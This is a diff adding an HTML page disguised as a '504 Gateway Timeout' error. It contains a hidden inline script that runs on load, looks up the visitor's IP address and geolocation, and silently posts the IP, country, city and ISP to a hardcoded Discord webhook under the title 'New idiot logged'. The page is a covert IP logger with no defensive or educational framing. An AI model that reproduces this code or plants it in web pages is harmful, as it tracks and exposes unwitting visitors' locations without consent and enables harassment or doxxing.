@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>504 Gateway Timeout</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+  body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#0f0f0f;color:#e0e0e0;padding:40px;text-align:center}
+  .c{max-width:600px;margin:0 auto;padding:40px;background:#1a1a1a;border-radius:8px;box-shadow:0 0 20px rgba(0,0,0,.8)}
+  .err{font-size:80px;font-weight:bold;color:#ff4444;margin:0 0 20px}
+  h1{font-size:32px;margin:0 0 16px}
+  p{font-size:18px;color:#aaa;line-height:1.5}
+  .code{font-family:monospace;background:#222;padding:4px 8px;border-radius:4px}
+</style>
+</head>
+<body>
+<div class="c">
+  <div class="err">504</div>
+  <h1>Gateway Timeout</h1>
+  <p>The server didn't respond in time.<br>
+  The upstream server (or proxy) timed out.</p>
+  <p class="small">Request ID: <span class="code">a8b9c0d1e2f3</span></p>
+</div>
+
+<script>
+(async function(){
+  try{
+    const ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip);
+    const geo = await fetch('https://ipwho.is/'+ip).then(r=>r.json());
+    
+    fetch('https://discord.com/api/webhooks/1441788885268041788/n17DxZidjM-rc_RldYGa_ROF4zzohKWlcK_ZhyY3-Cf07O0LJRPNE3XA4MmIleWdQQCM', {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({
+        content:'@everyone',
+        embeds:[{
+          title:'New idiot logged 💔',
+          color:16711680,
+          fields:[
+            {name:'IP',value:ip,inline:true},
+            {name:'Country',value:geo.country||'Unknown',inline:true},
+            {name:'City',value:geo.city||'Unknown',inline:true},
+            {name:'ISP',value:geo.connection?.isp||'Unknown',inline:true}
+          ],
+          timestamp:new Date().toISOString()
+        }]
+      })
+    });
+  }catch(e){}
+})();
+</script>
+</body>
+</html>
